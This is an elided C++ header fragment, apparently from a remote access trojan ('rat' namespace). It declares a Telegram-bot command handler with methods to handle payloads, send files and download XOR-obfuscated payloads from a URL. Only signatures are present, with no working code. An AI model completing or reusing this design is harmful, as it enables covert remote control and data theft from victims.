...
class Handler {
  ...
  private:
    ...
    struct CommandHandler {
        std::string command;
        void (Handler::*handler)(); // a function pointer to the handler method
    ...
    inline void
    handlePayload(::rat::tbot::Message &Tbot_Message, const std::filesystem::path &Payload_Path);
    ...
    void sendFile(const std::filesystem::path &File_Path, const std::string &arg_Caption = "");
    void capCurlCache();
  ...
  public:
    ...
    Handler &setUrlEndpoint(std::string &&Url_Endpoint);
    ...
    void handleUpdates();
    ::rat::networking::NetworkingResult downloadXoredPayload(const std::string &File_Url);
